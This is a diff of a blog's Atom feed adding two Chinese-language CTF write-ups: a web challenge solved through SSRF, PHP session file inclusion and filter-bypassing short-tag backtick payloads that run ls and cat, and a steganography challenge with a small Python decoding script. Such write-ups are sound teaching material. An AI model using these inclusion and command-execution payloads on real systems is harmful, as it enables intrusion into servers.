@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://daffodi11.github.io</id>
     <title>Daffodil</title>
-    <updated>2022-02-13T13:55:23.972Z</updated>
+    <updated>2022-02-13T14:25:24.636Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://daffodi11.github.io"/>
     <link rel="self" href="https://daffodi11.github.io/atom.xml"/>
@@ -10,6 +10,88 @@
     <logo>https://daffodi11.github.io/images/avatar.png</logo>
     <icon>https://daffodi11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Daffodil</rights>
+    <entry>
+        <title type="html"><![CDATA[Web-安全检测-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-an-quan-jian-ce-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-an-quan-jian-ce-writeup/">
+        </link>
+        <updated>2022-02-13T14:16:08.000Z</updated>
+        <content type="html"><![CDATA[<p>打开网站 看见登录框 CTF比赛 看见登录就想是不是SQL注入 或者与SESSION有关<br>
+测试后发现没有SQL注入 登录进去是一个检测网址 然后预览的工具 想到会不会有文件读取的漏洞<br>
+直接网址填写http://127.0.0.1 发现可以读取<br>
+<img src="https://daffodi11.github.io/post-images/1644761813449.png" alt="" loading="lazy"><br>
+去burp爆破 路径<br>
+<img src="https://daffodi11.github.io/post-images/1644761833137.png" alt="" loading="lazy"><br>
+发现路径 http://127.0.0.1/admin 去读取一下<br>
+<img src="https://daffodi11.github.io/post-images/1644761874616.png" alt="" loading="lazy"><br>
+发现include123.php 再去读取一下 得到源码<br>
+<img src="https://daffodi11.github.io/post-images/1644761900966.png" alt="" loading="lazy"><br>
+发现过滤了很多命令 而且有文件包含洞 先试一下SESSION包含<br>
+BURP抓包 改包<br>
+<img src="https://daffodi11.github.io/post-images/1644761924277.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644761939292.png" alt="" loading="lazy"><br>
+成功 然后尝试写入PHP代码<br>
+http://127.0.0.1/admin/include123.php?u=/tmp/sess_28d5aae86a8d2686a038956f34468348%26<?php%09echo%091;?><br>
+<img src="https://daffodi11.github.io/post-images/1644761960184.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644761985228.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644762003254.png" alt="" loading="lazy"><br>
+成功执行 ！看一下PHPINFO<br>
+http://127.0.0.1/admin/include123.php?u=/tmp/sess_28d5aae86a8d2686a038956f34468348%26<?php%09phpinfo();?><br>
+<img src="https://daffodi11.github.io/post-images/1644762024528.png" alt="" loading="lazy"><br>
+但是过滤了太多函数没有读取文件的好方法 但是发现short_open_tag 开启 ！可以用短标签<?=?><br>
+<img src="https://daffodi11.github.io/post-images/1644762043146.png" alt="" loading="lazy"><br>
+想要绕过check函数写shell，过滤了空格可以用 %09或者\t代替,过滤了php可以用短标签<?=?>代替，相当于&lt;? echo&gt;;<br>
+过滤了_可以用<?=``?>代替，反引号在php中有执行命令的效果</p>
+<?=`ls\t/`;?>
+<p>这部分知识可以在https://www.cnblogs.com/lthlsy/p/14894226.html这里找到<br>
+直接 ls 看一下目录 找到FLAG文件<br>
+<img src="https://daffodi11.github.io/post-images/1644762119646.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644762101464.png" alt="" loading="lazy"><br>
+直接 cat flag<br>
+http://127.0.0.1/admin/include123.php?u=/tmp/sess_28d5aae86a8d2686a038956f34468348%26<?=`cat\t/???????.sh`;?><br>
+得到<br>
+<img src="https://daffodi11.github.io/post-images/1644762220446.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644762214929.png" alt="" loading="lazy"><br>
+flag{4ede2e97-cbe8-424d-b9e6-f2150ad4515b</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Misc-鸣雏恋-writeup]]></title>
+        <id>https://daffodi11.github.io/post/misc-ming-chu-lian-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-ming-chu-lian-writeup/">
+        </link>
+        <updated>2022-02-13T14:00:17.000Z</updated>
+        <content type="html"><![CDATA[<p>第一步 用binwalk 解压doc 得到love.zip和key.txt<br>
+<img src="https://daffodi11.github.io/post-images/1644761387395.png" alt="" loading="lazy"><br>
+第二步 用VIM 查看 key.txt 发现是0字符隐藏加密<br>
+<img src="https://daffodi11.github.io/post-images/1644761403891.png" alt="" loading="lazy"><br>
+第三步<br>
+在线网站解密出压缩包密码 http://330k.github.io/misc_tools/unicode_steganography.html<br>
+<img src="https://daffodi11.github.io/post-images/1644761462543.png" alt="" loading="lazy"><br>
+解压出 雏田和鸣人的照片 盲猜二进制 写个脚本整理 根据大小标注01<br>
+<img src="https://daffodi11.github.io/post-images/1644761529045.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644761537975.png" alt="" loading="lazy"></p>
+<pre><code class="language-python">import os
+path = r'C:\Users\charon\Desktop\_鸣雏恋.docx.extracted\0\_rels\love\out'
+path_list = os.listdir(path)
+path_list.sort(key=lambda x:int(x[:-4]))
+def write(num):
+    f = open(r&quot;C:\Users\charon\Desktop\test.txt&quot;, &quot;a&quot;)
+    f.write(num)
+    f.close()
+for i in range(0,129488):
+    if os.path.getsize(path+r'\\'+path_list[i]) &gt; 262:
+        write(&quot;1&quot;)
+    else:
+        write(&quot;0&quot;)
+</code></pre>
+<p>得到二进制 在线二进制转字符串<br>
+<img src="https://daffodi11.github.io/post-images/1644761696223.png" alt="" loading="lazy"><br>
+base64转图片得到FLAG<br>
+<img src="https://daffodi11.github.io/post-images/1644761718794.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1644761724400.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Misc-层层取证-writeup]]></title>
         <id>https://daffodi11.github.io/post/misc-ceng-ceng-qu-zheng-writeup/</id>
